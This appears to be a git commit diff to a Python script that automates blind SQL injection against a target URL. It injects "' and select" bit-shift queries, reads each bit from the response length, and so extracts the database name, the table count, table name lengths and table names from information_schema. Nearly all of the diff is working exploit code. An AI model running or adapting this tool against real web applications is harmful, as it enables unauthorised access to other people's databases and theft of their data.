0c631351fc52591aa86f60609374f9e027352dc4
WinterMute1000 <42152852+WinterMute1000@users.noreply.github.com>
2021-12-21 15:10:17 +0900

    Table info

--- get_db_table_information.py
+++ get_db_table_information.py
@@ -33,20 +33,71 @@ class GetDbTableInformationClass:
         print(self.db_name_length)
 
     def get_db_name(self):
+        # one character list, not string
         db_name_char_list = []
         for db_name_idx in range(self.db_name_length):
             db_name_char_bin_list = []
             for shift_idx in range(7, -1, -1):
                 res_length = len(requests.get(requote_uri(self.TARGET_URL + '\' and select ' +
                                                           bitwise_public.DATA_BIT_SHIFT_QUERY.format('db_name()',
-                                                                                                     db_name_idx,
+                                                                                                     db_name_idx + 1,
                                                                                                      shift_idx,
                                                                                                      0))).text)
                 db_name_char_bin_list.append(int(res_length == self.SUCCESS_LENGTH))
+
             db_name_char_list.append(bitwise_public.parsing_bin_list_to_char(db_name_char_bin_list))
 
         self.db_name = ''.join(db_name_char_list)
         print(self.db_name)
+
+    def get_tables_number(self):
+        number_bin_list = []
+        for shift_idx in range(7, -1, -1):
+            # Need know DB name
+            res_length = len(requests.get(requote_uri(self.TARGET_URL + '\' and select ' +
+                                                      bitwise_public.DATA_COUNT_SHIFT_QUERY.format(
+                                                          """select count(*) from information_schema.tables 
+                                                          where table_schema = '{0}'""".format(self.db_name)
+                                                          , shift_idx))).text)
+            number_bin_list.append(int(res_length == self.SUCCESS_LENGTH))
+
+        self.tables_number = bitwise_public.parsing_bin_list_to_decimal(number_bin_list)
+        print(self.tables_number)
+
+    def get_tables_length(self):
+        for table_idx in range(self.tables_number):
+            tables_length_bin_list = []
+            for shift_idx in range(7, -1, -1):
+                res_length = len(requests.get(requote_uri(self.TARGET_URL + '\' and select ' +
+                                                          bitwise_public.DATA_LENGTH_SHIFT_QUERY.format("""select TABLE_NAME
+                                                          from information_schema.tables where table_schema = '{0}'
+                                                          limit {1},1""".format(self.db_name, table_idx),
+                                                                                                        shift_idx))).text)
+                tables_length_bin_list.append(int(res_length == self.SUCCESS_LENGTH))
+
+            self.tables_name_length.append(bitwise_public.parsing_bin_list_to_decimal(tables_length_bin_list))
+
+        print(self.tables_name_length)
+
+    def get_tables_name(self):
+        for table_idx in range(self.tables_number):
+            table_char_list = []
+            for table_name_idx in range(self.tables_name_length[table_idx]):
+                table_name_char_bin_list = []
+                for shift_idx in range(7, -1, -1):
+                    res_length = len(requests.get(requote_uri(self.TARGET_URL + '\' and select ' +
+                                                              bitwise_public.DATA_BIT_SHIFT_QUERY.format("""select 
+                                                              TABLE_NAME from information_schema.tables 
+                                                              where table_schema = '{0}'
+                                                              """.format(self.db_name),
+                                                                                                         table_name_idx,
+                                                                                                         shift_idx,
+                                                                                                         table_idx))).text)
+                    table_name_char_bin_list.append(int(res_length == self.SUCCESS_LENGTH))
+
+                table_char_list.append(bitwise_public.parsing_bin_list_to_char(table_name_char_bin_list))
+
+            self.tables_name.append(''.join(table_char_list))
 
     # Getter
     def db_name_getter(self):
